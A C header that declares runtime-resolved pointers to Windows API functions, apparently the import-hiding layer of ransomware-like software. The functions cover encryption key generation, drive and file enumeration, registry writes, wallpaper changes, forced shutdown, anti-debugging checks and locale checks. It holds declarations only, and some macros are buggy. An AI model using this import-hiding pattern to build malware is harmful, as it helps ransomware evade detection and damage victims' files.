#pragma once
#include <Windows.h>
#include <Wininet.h>
#include <Shlobj.h>
#include <Tlhelp32.h>

/* function types (must be typedef'd to preserve calling convention) */
/* user32.dll */
typedef void(__stdcall *MessageBoxAFunc)(HWND hWnd, LPCSTR lpText,
	LPCSTR lpCaption, UINT uType);
typedef void(__stdcall *MessageBoxWFunc)(HWND hWnd, LPCWSTR lpText,
	LPCWSTR lpCaption, UINT uType);

typedef HKL(__stdcall *GetKeyboardLayoutFunc)(DWORD idThread);

typedef BOOL(__stdcall *SystemParametersInfoAFunc)(UINT uiAction,
	UINT uiParam, PVOID pvParam, UINT fWinIni);
typedef BOOL(__stdcall *SystemParametersInfoWFunc)(UINT uiAction,
	UINT uiParam, PVOID pvParam, UINT fWinIni);

typedef int(__cdecl *wsprintfAFunc)(LPSTR lpOut, LPCSTR lpFmt, ...);
typedef int(__cdecl *wsprintfWFunc)(LPWSTR lpOut, LPCWSTR lpFmt, ...);

/* shell32.dll */
typedef HRESULT(__stdcall *SHGetFolderPathAFunc)(HWND hwndOwner, int nFolder,
	HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
typedef HRESULT(__stdcall *SHGetFolderPathWFunc)(HWND hwndOwner, int nFolder,
	HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);

/* advapi32.dll */
typedef BOOL(__stdcall *CryptAcquireContextAFunc)(HCRYPTPROV *phProv,
	LPCSTR pszContainer, LPCSTR pszProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(__stdcall *CryptAcquireContextWFunc)(HCRYPTPROV *phProv,
	LPCWSTR pszContainer, LPCWSTR pszProvider, DWORD dwProvType, DWORD dwFlags);

typedef BOOL(__stdcall *CryptReleaseContextFunc)(HCRYPTPROV hProv, DWORD dwFlags);

typedef BOOL(__stdcall *CryptGenKeyFunc)(HCRYPTPROV hProv, ALG_ID Algid,
	DWORD dwFlags, HCRYPTKEY *phKey);

typedef LONG(__stdcall *RegDeleteKeyValueAFunc)(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName);
typedef LONG(__stdcall *RegDeleteKeyValueWFunc)(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName);

typedef LONG(__stdcall *RegSetValueExAFunc)(HKEY hKey, LPCSTR lpValueName,
	DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG(__stdcall *RegSetValueExWFunc)(HKEY hKey, LPCWSTR lpValueName,
	DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);

typedef LONG(__stdcall *RegCloseKeyFunc)(HKEY hKey);

typedef BOOL(__stdcall *GetCurrentHwProfileAFunc)(LPHW_PROFILE_INFOA lpHwProfileInfo);
typedef BOOL(__stdcall *GetCurrentHwProfileWFunc)(LPHW_PROFILE_INFOW lpHwProfileInfo);

typedef BOOL(__stdcall *CryptDecryptFunc)(HCRYPTKEY hKey, HCRYPTHASH hHash,
	BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL(__stdcall *CryptEncryptFunc)(HCRYPTKEY hKey, HCRYPTHASH hHash,
	BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);

typedef BOOL(__stdcall *CryptImportKeyFunc)(HCRYPTPROV hProv, BYTE *pbData,
	DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);

typedef BOOL(__stdcall *CryptExportKeyFunc)(HCRYPTPROV hProv, HCRYPTKEY hExpKey,
	DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);

typedef BOOL(__stdcall *CryptDestroyKeyFunc)(HCRYPTKEY hKey);

typedef BOOL(__stdcall *InitiateSystemShutdownExAFunc)(LPSTR lpMachineName, LPSTR lpMessage,
	DWORD dwTimeout, BOOL bForceAppsClosed, BOOL bRebootAfterShutdown, DWORD dwReason);
typedef BOOL(__stdcall *InitiateSystemShutdownExWFunc)(LPWSTR lpMachineName, LPWSTR lpMessage,
	DWORD dwTimeout, BOOL bForceAppsClosed, BOOL bRebootAfterShutdown, DWORD dwReason);

/* kernel32.dll */
typedef HANDLE(__stdcall *CreateFileAFunc)(LPCSTR lpFileName,
	DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef HANDLE(__stdcall *CreateFileWFunc)(LPCWSTR lpFileName,
	DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(__stdcall *IsDebuggerPresentFunc)(void);

typedef BOOL(__stdcall *CloseHandleFunc)(HANDLE hObject);

typedef LPVOID(__stdcall *HeapAllocFunc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);

typedef BOOL(__stdcall *HeapFreeFunc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);

typedef void(__stdcall *SleepFunc)(DWORD dwMilliseconds);
typedef BOOL(__stdcall *TerminateProcessFunc)(HANDLE hProcess, UINT uExitCode);
typedef BOOL(__stdcall *GetExitCodeProcessFunc)(HANDLE hProcess, LPDWORD lpExitCode);

typedef HANDLE(__stdcall *GetCurrentThreadFunc)(void);

typedef BOOL(__stdcall *GetThreadContextFunc)(HANDLE hThread, LPCONTEXT lpContext);


typedef BOOL(__stdcall *FreeLibraryFunc)(HMODULE hModule);

typedef FARPROC(__stdcall *GetProcAddressFunc)(HMODULE hModule, LPCSTR lpProcName);

typedef HMODULE(__stdcall *LoadLibraryAFunc)(LPCSTR lpFileName);
typedef HMODULE(__stdcall *LoadLibraryWFunc)(LPCWSTR lpFileName);

typedef BOOL(__stdcall *CopyFileAFunc)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName,
	BOOL bFailIfExists);
typedef BOOL(__stdcall *CopyFileWFunc)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName,
	BOOL bFailIfExists);

typedef HANDLE(__stdcall *CreateToolhelp32SnapshotFunc)(DWORD dwFlags, DWORD th32ProcessID);

typedef BOOL(__stdcall *Process32FirstFunc)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(__stdcall *Process32FirstWFunc)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

typedef BOOL(__stdcall *Process32NextFunc)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(__stdcall *Process32NextWFunc)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

typedef BOOL(__stdcall *GetFileSizeExFunc)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

typedef BOOL(__stdcall *ReadFileFunc)(HANDLE hFile, LPVOID lpBuffer,
	DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);

typedef BOOL(__stdcall *SetEndOfFileFunc)(HANDLE hFile);

typedef DWORD(__stdcall *SetFilePointerFunc)(HANDLE hFile, LONG lDistanceToMove,
	PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);

typedef BOOL(__stdcall *SetFilePointerExFunc)(HANDLE hFile, LARGE_INTEGER liDistanceToMove,
	PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);

typedef BOOL(__stdcall *WriteFileFunc)(HANDLE hFile, LPCVOID lpBuffer,
	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

typedef DWORD(__stdcall *GetLastErrorFunc)(void);

typedef HANDLE(__stdcall *GetProcessHeapFunc)(void);

typedef HLOCAL(__stdcall *LocalFreeFunc)(HLOCAL hMem);

typedef BOOL(__stdcall *MoveFileAFunc)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
typedef BOOL(__stdcall *MoveFileWFunc)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);

typedef LPVOID(__stdcall *HeapReAllocFunc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);

typedef BOOL(__stdcall *FindCloseFunc)(HANDLE hFindFile);

typedef HANDLE(__stdcall *FindFirstFileAFunc)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef HANDLE(__stdcall *FindFirstFileWFunc)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);

typedef BOOL(__stdcall *FindNextFileAFunc)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFile);
typedef BOOL(__stdcall *FindNextFileWFunc)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFile);

typedef DWORD(__stdcall *GetLogicalDriveStringsAFunc)(DWORD nBufferLength, LPSTR lpBuffer);
typedef DWORD(__stdcall *GetLogicalDriveStringsWFunc)(DWORD nBufferLength, LPWSTR lpBuffer);

typedef int(__stdcall *lstrcmpAFunc)(LPCSTR lpString1, LPCSTR lpString2);
typedef int(__stdcall *lstrcmpWFunc)(LPCWSTR lpString1, LPCWSTR lpString2);

typedef int(__stdcall *MultiByteToWideCharFunc)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr,
	int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

typedef void(__stdcall *ExitProcessFunc)(UINT uExitCode);

typedef LCID(__stdcall *GetUserDefaultLCIDFunc)(void);

typedef int(__stdcall *lstrlenAFunc)(LPCSTR lpString);
typedef int(__stdcall *lstrlenWFunc)(LPCWSTR lpString);

typedef BOOL(__stdcall *CreateProcessAFunc)(
	LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
	LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL(__stdcall *CreateProcessWFunc)(
	LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
	LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation);
typedef HANDLE(__stdcall *OpenProcessFunc)(
	 DWORD dwDesiredAccess,
	 BOOL  bInheritHandle,
	 DWORD dwProcessId
	);
typedef DWORD(__stdcall *WaitForSingleObjectFunc)(HANDLE hHandle, DWORD dwMilliseconds);

typedef DWORD(__stdcall *GetModuleFileNameAFunc)(HMODULE hModule, LPCSTR lpFilename,
	DWORD nSize);
typedef DWORD(__stdcall *GetModuleFileNameWFunc)(HMODULE hModule, LPCWSTR lpFilename,
	DWORD nSize);

typedef LONG(__stdcall *RegCreateKeyExAFunc)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved,
	LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PHKEY phkResult, LPDWORD lpdwDisposition);
typedef LONG(__stdcall *RegCreateKeyExWFunc)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved,
	LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PHKEY phkResult, LPDWORD lpdwDisposition);

/* crypt32.dll */
typedef BOOL(__stdcall *CryptDecodeObjectExFunc)(DWORD dwCertEncodingType,
	LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags,
	PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);

typedef BOOL(__stdcall *CryptImportPublicKeyInfoFunc)(HCRYPTPROV hCryptProv,
	DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY *phKey);

typedef BOOL(__stdcall *CryptStringToBinaryAFunc)(LPCSTR pszString, DWORD cchString,
	DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

typedef BOOL(__stdcall *CryptStringToBinaryWFunc)(LPCSTR pszString, DWORD cchString,
	DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

/* shlwapi.dll */
typedef PSTR(__stdcall *PathFindExtensionAFunc)(PSTR pszPath);
typedef PWSTR(__stdcall *PathFindExtensionWFunc)(PWSTR pszPath);

/* wininet.dll */
typedef BOOL(__stdcall *InternetSetCookieAFunc)(LPCSTR lpszUrl,
	LPCSTR lpszCookieName, LPCSTR lpszCookieData);
typedef BOOL(__stdcall *InternetSetCookieWFunc)(LPCWSTR lpszUrl,
	LPCWSTR lpszCookieName, LPCWSTR lpszCookieData);

typedef BOOL(__stdcall *InternetReadFileFunc)(HINTERNET hFile, LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

typedef HINTERNET(__stdcall *InternetOpenUrlAFunc)(HINTERNET hInternet, LPCSTR lpszUrl,
	LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
typedef HINTERNET(__stdcall *InternetOpenUrlWFunc)(HINTERNET hInternet, LPCWSTR lpszUrl,
	LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);

typedef BOOL(__stdcall *InternetCloseHandleFunc)(HINTERNET hInternet);

typedef HINTERNET(__stdcall *InternetOpenAFunc)(LPCSTR lpszAgent, DWORD dwAccessType,
	LPCSTR lpszProxyName, LPCSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET(__stdcall *InternetOpenWFunc)(LPCWSTR lpszAgent, DWORD dwAccessType,
	LPCWSTR lpszProxyName, LPCWSTR lpszProxyBypass, DWORD dwFlags);

/* function prototypes */
extern MessageBoxAFunc _MessageBoxA;
extern MessageBoxWFunc _MessageBoxW;
extern GetKeyboardLayoutFunc _GetKeyboardLayout;
extern SystemParametersInfoAFunc _SystemParametersInfoA;
extern SystemParametersInfoWFunc _SystemParametersInfoW;
extern wsprintfAFunc _wsprintfA;
extern wsprintfWFunc _wsprintfW;

extern SHGetFolderPathAFunc _SHGetFolderPathA;
extern SHGetFolderPathWFunc _SHGetFolderPathW;
extern CryptAcquireContextAFunc _CryptAcquireContextA;
extern CryptAcquireContextWFunc _CryptAcquireContextW;
extern CryptReleaseContextFunc _CryptReleaseContext;
extern CryptGenKeyFunc _CryptGenKey;
extern RegDeleteKeyValueAFunc _RegDeleteKeyValueA;
extern RegDeleteKeyValueWFunc _RegDeleteKeyValueW;
extern RegSetValueExAFunc _RegSetValueExA;
extern RegSetValueExWFunc _RegSetValueExW;
extern RegCloseKeyFunc _RegCloseKey;
extern GetCurrentHwProfileAFunc _GetCurrentHwProfileA;
extern GetCurrentHwProfileWFunc _GetCurrentHwProfileW;
extern CryptDecryptFunc _CryptDecrypt;
extern CryptEncryptFunc _CryptEncrypt;
extern CryptImportKeyFunc _CryptImportKey;
extern CryptExportKeyFunc _CryptExportKey;
extern CryptDestroyKeyFunc _CryptDestroyKey;
extern InitiateSystemShutdownExAFunc _InitiateSystemShutdownExA;
extern InitiateSystemShutdownExWFunc _InitiateSystemShutdownExW;

extern CreateFileAFunc _CreateFileA;
extern CreateFileWFunc _CreateFileW;
extern IsDebuggerPresentFunc _IsDebuggerPresent;
extern CloseHandleFunc _CloseHandle;
extern HeapAllocFunc _HeapAlloc;
extern HeapFreeFunc _HeapFree;
extern GetCurrentThreadFunc _GetCurrentThread;
extern GetThreadContextFunc _GetThreadContext;

extern SleepFunc _Sleep;
extern TerminateProcessFunc _TerminateProcess;
extern GetExitCodeProcessFunc _GetExitCodeProcess;

extern FreeLibraryFunc _FreeLibrary;

extern GetProcAddressFunc _GetProcAddress;
extern LoadLibraryAFunc _LoadLibraryA;
extern LoadLibraryWFunc _LoadLibraryW;
extern CopyFileAFunc _CopyFileA;
extern CopyFileWFunc _CopyFileW;
extern CreateToolhelp32SnapshotFunc _CreateToolhelp32Snapshot;
extern Process32FirstFunc _Process32First;
extern Process32FirstWFunc _Process32FirstW;
extern Process32NextFunc _Process32Next;
extern Process32NextWFunc _Process32NextW;
extern GetFileSizeExFunc _GetFileSizeEx;
extern ReadFileFunc _ReadFile;
extern SetEndOfFileFunc _SetEndOfFile;
extern SetFilePointerFunc _SetFilePointer;
extern SetFilePointerExFunc _SetFilePointerEx;
extern WriteFileFunc _WriteFile;
extern GetLastErrorFunc _GetLastError;
extern GetProcessHeapFunc _GetProcessHeap;
extern LocalFreeFunc _LocalFree;
extern MoveFileAFunc _MoveFileA;
extern MoveFileWFunc _MoveFileW;
extern HeapReAllocFunc _HeapReAlloc;
extern FindCloseFunc _FindClose;
extern FindFirstFileAFunc _FindFirstFileA;
extern FindFirstFileWFunc _FindFirstFileW;
extern FindNextFileAFunc _FindNextFileA;
extern FindNextFileWFunc _FindNextFileW;
extern GetLogicalDriveStringsAFunc _GetLogicalDriveStringsA;
extern GetLogicalDriveStringsWFunc _GetLogicalDriveStringsW;

extern lstrcmpAFunc _lstrcmpA;
extern lstrcmpWFunc _lstrcmpW;
extern MultiByteToWideCharFunc _MultiByteToWideChar;
extern ExitProcessFunc _ExitProcess;
extern GetUserDefaultLCIDFunc _GetUserDefaultLCID;

extern lstrlenAFunc _lstrlenA;
extern lstrlenWFunc _lstrlenW;
extern CreateProcessAFunc _CreateProcessA;
extern CreateProcessWFunc _CreateProcessW;
extern WaitForSingleObjectFunc _WaitForSingleObject;
extern GetModuleFileNameAFunc _GetModuleFileNameA;
extern GetModuleFileNameWFunc _GetModuleFileNameW;
extern RegCreateKeyExAFunc _RegCreateKeyExA;
extern RegCreateKeyExWFunc _RegCreateKeyExW;

extern CryptDecodeObjectExFunc _CryptDecodeObjectEx;
extern CryptImportPublicKeyInfoFunc _CryptImportPublicKeyInfo;
extern CryptStringToBinaryAFunc _CryptStringToBinaryA;
extern CryptStringToBinaryWFunc _CryptStringToBinaryW;

/* TODO: Change to PathFindExtensionFunc */
extern PathFindExtensionAFunc _PathFindExtensionA;
extern PathFindExtensionWFunc _PathFindExtensionW;

extern InternetSetCookieAFunc _InternetSetCookieA;
extern InternetSetCookieWFunc _InternetSetCookieW;
extern InternetReadFileFunc _InternetReadFile;
extern InternetOpenUrlAFunc _InternetOpenUrlA;
extern InternetOpenUrlWFunc _InternetOpenUrlW;
extern InternetCloseHandleFunc _InternetCloseHandle;
extern InternetOpenAFunc _InternetOpenA;
extern InternetOpenWFunc _InternetOpenW;

#ifdef UNICODE
#define _MessageBox _MessageBoxW
#define _SystemParametersInfo _SystemParametersInfoW;
#define _wsprintf _wsprintfW;

#define _SHGetFolderPath _SHGetFolderPathW
#define _CryptAcquireContext _CryptAcquireContextW
#define _RegDeleteKey _RegDeleteKeyW
#define _RegSetValueEx _RegSetValueExW
#define _GetCurrentHwProfile _GetCurrentHwProfileW
#define _InitiateSystemShutdownEx _InitiateSystemShutdownExW

#define _CreateFile _CreateFileW
#define _MoveFile _MoveFileW
#define _FindFirstFile _FindFirstFileW
#define _FindNextFile _FindNextFileW
#define _GetLogicalDriveStrings _GetLogicalDriveStringsW

#define _lstrcmp _lstrcmpW
#define _lstrlen _lstrlenW
#define _CreateProcess _CreateProcessW
#define _GetModuleFileName _GetModuleFileNameW
#define _RegCreateKeyEx _RegCreateKeyExW

#define _CryptStringToBinary _CryptStringToBinaryW

#define _PathFindExtension _PathFindExtensionW

#define _InternetSetCookie _InternetSetCookieW
#define _InternetOpenUrl _InternetOpenUrlW
#define _InternetOpen _InternetOpenW

#else /* !UNICODE */
#define _MessageBox _MessageBoxA
#define _SystemParametersInfo _SystemParametersInfoA;
#define _wsprintf _wsprintfA;

#define _SHGetFolderPath _SHGetFolderPathA
#define _CryptAcquireContext _CryptAcquireContextA
#define _RegDeleteKey _RegDeleteKeyA
#define _RegSetValueEx _RegSetValueExA
#define _GetCurrentHwProfile _GetCurrentHwProfileA
#define _InitiateSystemShutdownEx _InitiateSystemShutdownExW

#define _CreateFile _CreateFileA
#define _MoveFile _MoveFileA
#define _FindFirstFile _FindFirstFileA
#define _FindNextFile _FindNextFileA
#define _GetLogicalDriveStrings _GetLogicalDriveStringsA

#define _lstrcmp _lstrcmpA
#define _lstrlen _lstrlenA
#define _CreateProcess _CreateProcessA
#define _GetModuleFileName _GetModuleFileNameA
#define _RegCreateKeyEx _RegCreateKeyExA

#define _CryptStringToBinary _CryptStringToBinaryA

#define _PathFindExtension _PathFindExtensionA

#define _InternetSetCookie _InternetSetCookieA
#define _InternetOpenUrl _InternetOpenUrlA
#define _InternetOpen _InternetOpenA
#endif // UNICODE <- weird problem if you try switching comment types?!

/* functions to initialize and uninitialize imports */
BOOL LoadIATFuncs(LPVOID lpvBaseAddr);
void UnloadIATFuncs();